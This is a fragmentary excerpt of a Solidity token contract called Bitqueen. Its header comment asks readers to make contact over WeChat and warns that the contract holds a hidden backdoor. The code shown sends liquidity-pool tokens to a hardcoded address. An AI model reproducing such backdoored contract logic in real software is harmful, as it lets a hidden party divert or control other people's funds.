// ░██████╗░ snail exclusive
// ██╔════╝  0905 Bitqueen
// ╚█████╗░  Please add WeChat for details ll20221026X
// ░╚═══██╗  This contract has a hidden vulnerability backdoor mechanism, please do not use it
// ██████╔╝  
// ╚═════╝
        ...
        if (lpAmount > 0) {
            ...
            if (lpFist > 0) {
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpFist, 0, 0, address(0xf67d404Cd0649DC476e6fC3ed052057B806647a5), block.timestamp
                );
            }
        }
    }
...
contract Bitqueen is AbsToken {
    constructor() AbsToken(
        ...
        address(0xf67d404Cd0649DC476e6fC3ed052057B806647a5)//ReceiveAddress
    ){
    }
}